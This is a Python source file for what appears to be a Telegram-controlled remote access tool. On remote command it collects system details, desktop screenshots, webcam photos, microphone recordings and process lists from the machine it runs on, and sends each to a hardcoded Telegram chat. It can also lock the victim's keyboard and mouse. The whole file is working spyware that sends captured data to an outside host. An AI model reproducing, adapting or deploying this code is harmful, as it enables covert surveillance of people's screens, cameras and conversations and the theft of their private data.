import asyncio
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile, CallbackQuery
from aiogram import Router, Bot, F
from dotenv import load_dotenv
import getpass
import platform
import socket
from datetime import datetime
from uuid import getnode as get_mac
import psutil
import pyautogui
import pyaudio
import wave
from subprocess import Popen, PIPE
import cv2
import os
import keyboard
import app.keyboards as kb


router = Router()
load_dotenv()
api_key = os.getenv("API_KEY")
bot = Bot(token=api_key)
chat_id = 1297964385
autoname = "FILENAME.py"

path = os.path.dirname(os.path.realpath(__file__))
address = os.path.join(path, autoname)
pyautogui.FAILSAFE = False
unlock_event = asyncio.Event()
recording_event = asyncio.Event()

@router.message(Command('start'))
async def cmd_check(message: Message):
    await message.answer("Hello!\nTo find out all the bot's capabilities, type the command /help")

@router.callback_query(F.data == 'check')
async def btn_check(callback: CallbackQuery):
    await callback.message.answer("System status: online")
    await callback.answer()

@router.message(Command('check'))
async def cmd_check(message: Message):
    await message.answer("System status: online")

@router.message(Command('help'))
async def cmd_help(message: Message):
    await message.answer(f'\nCommand List:\n/check - Checking System Status\n/info - System characteristics\n/screen - Desktop screenshot\n/audio - Record audio from a voice recorder for a minute\n/process - List of running processes\n/camera - Make a photo\n/lock - lock keyboard and mouse\n/unlock - unlock keyboard and mouse', reply_markup=kb.main)


async def handle_info(message_or_callback, bot: Bot):


    await message_or_callback.answer("Taking info about system...")
    start = datetime.now()
    name = getpass.getuser()
    ip = socket.gethostbyname(socket.gethostname())
    mac = get_mac()
    ost = platform.uname()

    zone = psutil.boot_time()
    time = datetime.fromtimestamp(zone)
    cpu = psutil.cpu_freq()
    ends = datetime.now()
    workspeed = format(ends - start)
    file_path = "info.txt"
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(
            f"[================================================]\n"
            f"  Operating System: {ost.system}\n"
            f"  Processor: {ost.processor}\n"
            f"  Username: {name}\n"
            f"  IP address: {ip}\n"
            f"  MAC address: {mac}\n"
            f"  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n"
            f"  Work speed: {workspeed}\n"
            f"  Max Frequency: {cpu.max:.2f} Mhz\n"
            f"  Min Frequency: {cpu.min:.2f} Mhz\n"
            f"  Current Frequency: {cpu.current:.2f} Mhz\n"
            f"[================================================]\n"
        )
    try:
        current_path = os.path.join(os.getcwd(), file_path)
        document = FSInputFile(current_path)
        await bot.send_document(chat_id=chat_id, document=document)
    except Exception as e:
        error_msg = str(e)
        if isinstance(message_or_callback, CallbackQuery):
            await message_or_callback.message.answer(error_msg)
        else:
            await message_or_callback.answer(error_msg)
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)


@router.message(Command('info'))
async def cmd_info(message: Message, bot: Bot):
    await handle_info(message, bot)


@router.callback_query(F.data == 'info')
async def btn_info(callback: CallbackQuery, bot: Bot):
    await handle_info(callback, bot)


async def handle_screen(message_or_callback, bot: Bot):
    await message_or_callback.answer("Making a screenshot...")
    pyautogui.screenshot("screenshot.jpg")
    current_path = os.path.join(os.getcwd(), "screenshot.jpg")
    photo = FSInputFile(current_path)
    await bot.send_photo(chat_id=chat_id, photo=photo)
    os.remove("screenshot.jpg")

@router.message(Command('screen'))
async def cmd_info(message: Message, bot: Bot):
    await handle_screen(message, bot)


@router.callback_query(F.data == 'screen')
async def btn_info(callback: CallbackQuery, bot: Bot):
    await handle_screen(callback, bot)


async def handle_camera(message_or_callback, bot: Bot):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await message_or_callback.answer("Error: Could not open webcam")
        return
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("captured_image.jpg", frame)
        current_path = os.path.join(os.getcwd(), "captured_image.jpg")
        photo = FSInputFile(current_path)
        await bot.send_photo(chat_id=chat_id, photo=photo)
        os.remove("captured_image.jpg")
    else:
        await message_or_callback.answer("Failed to capture image")
    cap.release()
    cv2.destroyAllWindows()

@router.message(Command('camera'))
async def cmd_camera(message: Message, bot: Bot):
    await handle_camera(message, bot)


@router.callback_query(F.data == 'camera')
async def btn_camera(callback: CallbackQuery, bot: Bot):
    await handle_camera(callback, bot)


def record_audio():
    chunk = 1024
    rate = 44100
    channels = 1
    format = pyaudio.paInt16

    p = pyaudio.PyAudio()
    stream = p.open(format=format, channels=channels, rate=rate,
                    input=True, frames_per_buffer=chunk)

    frames = []
    while not recording_event.is_set():
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    return frames

async def handle_start_recording_audio(message_or_callback, bot: Bot):
    recording_event.clear()
    await message_or_callback.answer("Start recording...")
    loop = asyncio.get_running_loop()
    frames = await loop.run_in_executor(None, record_audio)

    names = "sound.wav"

    wf = wave.open(names, "wb")
    wf.setnchannels(1)
    wf.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(frames))
    wf.close()

    current_path = os.path.join(os.getcwd(), "sound.wav")
    audio = FSInputFile(current_path)

    await bot.send_audio(chat_id=chat_id, audio=audio)
    os.remove(names)

@router.message(Command('start'))
async def cmd_start_audio(message: Message, bot: Bot):
    await handle_start_recording_audio(message, bot)


@router.callback_query(F.data == 'start')
async def btn_start_audio(callback: CallbackQuery, bot: Bot):
    await handle_start_recording_audio(callback, bot)

async def handle_stop_recording_audio(message_or_callback, bot: Bot):
    recording_event.set()
    await message_or_callback.answer("Stop recording")

@router.message(Command('stop'))
async def cmd_stop_audio(message: Message, bot: Bot):
    await handle_stop_recording_audio(message, bot)

@router.callback_query(F.data == 'stop')
async def btn_stop_audio(callback: CallbackQuery, bot: Bot):
    await handle_stop_recording_audio(callback, bot)

async def handle_process(message_or_callback, bot: Bot):
    await message_or_callback.answer("Search all process...")
    process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
    ride = open("process.txt", "w", encoding="utf-8")
    ride.write(' '.join(process))
    ride.close()
    current_path = os.path.join(os.getcwd(), "process.txt")
    current = FSInputFile(current_path)
    await bot.send_document(chat_id=chat_id, document=current)
    ride.close()
    os.remove("process.txt")

@router.message(Command('process'))
async def cmd_process(message: Message, bot: Bot):
    await handle_process(message, bot)


@router.callback_query(F.data == 'process')
async def btn_process(callback: CallbackQuery, bot: Bot):
    await handle_process(callback, bot)

async def handle_lock(message_or_callback, bot: Bot):
    unlock_event.clear()
    await message_or_callback.answer("🔒 Locked! Mouse will move continuously until unlocked.")

    while not unlock_event.is_set():
        for i in range(150):
            keyboard.block_key(i)
        pyautogui.moveTo(0, 0, duration=0.1)
        await asyncio.sleep(0.1)
@router.message(Command('lock'))
async def cmd_lock(message: Message, bot: Bot):
    await handle_lock(message, bot)

@router.callback_query(F.data == 'lock')
async def btn_lock(callback: CallbackQuery, bot: Bot):
    await handle_lock(callback, bot)


async def handle_unlock(message_or_callback, bot: Bot):
    unlock_event.set()
    await message_or_callback.answer("🔓 Unlocked! Mouse will move continuously until unlocked.")

@router.message(Command('unlock'))
async def cmd_unlock(message: Message, bot: Bot):
    await handle_unlock(message, bot)

@router.callback_query(F.data == 'unlock')
async def btn_unlock(callback: CallbackQuery, bot: Bot):
    await handle_unlock(callback, bot)